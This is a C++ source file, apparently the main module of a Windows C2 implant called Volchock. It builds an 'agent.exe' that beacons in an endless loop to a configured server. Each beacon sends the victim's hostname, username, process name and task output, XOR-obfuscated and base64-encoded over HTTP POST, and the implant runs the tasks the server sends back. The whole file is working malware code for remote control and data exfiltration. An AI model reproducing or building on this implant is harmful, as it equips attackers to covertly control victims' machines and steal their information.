// Compile with : x86_64-w64-mingw32-g++ -o agent.exe main_exe.cpp base64.cpp crypt.cpp system_utils.cpp file_utils.cpp http_client.cpp task.cpp pe-exec.cpp -lwininet -lpsapi -static-libstdc++ -static-libgcc -lws2_32
#include <windows.h>
#include <iostream>
#include <thread>
#include <chrono>
#include <sstream>  
#include "config.h"
#include "system_utils.h"
#include "base64.h"
#include "crypt.h"
#include "http_client.h"
#include "task.h"

std::string beakon(const std::string& data_res) {
    std::string agent_id = generate_agent_id();
    std::string hostname = get_hostname();
    std::string username = get_username();
    std::string process_name = get_process_name();
    std::ostringstream ss;
    ss << "{";
    ss << "\"agent_id\":\"" << agent_id << "\",";
    ss << "\"hostname\":\"" << hostname << "\",";
    ss << "\"username\":\"" << username << "\",";
    ss << "\"process_name\":\"" << process_name << "\",";
    ss << "\"results\":\"" << data_res << "\"";
    ss << "}";
    std::string result_json = ss.str();
    std::string encoded = xor_data(result_json, XOR_KEY);
    std::string b64_encoded = base64_encode(encoded);
    std::string res = http_post(VOLCHOCK_SERVER, VOLCHOCK_PORT, RESULTS_PATH, USER_AGENT, HEADER, b64_encoded);
    return res;
}

void agent_run() {
    std::setvbuf(stdout, NULL, _IONBF, 0);
    std::string register_call = beakon("");
    std::string result;
    while (true) {
        std::this_thread::sleep_for(std::chrono::seconds(BEACON_INTERVAL));
        std::string beakon_call = beakon(result);
        result = parse_task(beakon_call);
    }
}

int main() {
    //MessageBoxA(0, "START AGENT !", "Volchock", 0);
    agent_run();
    return 0;
}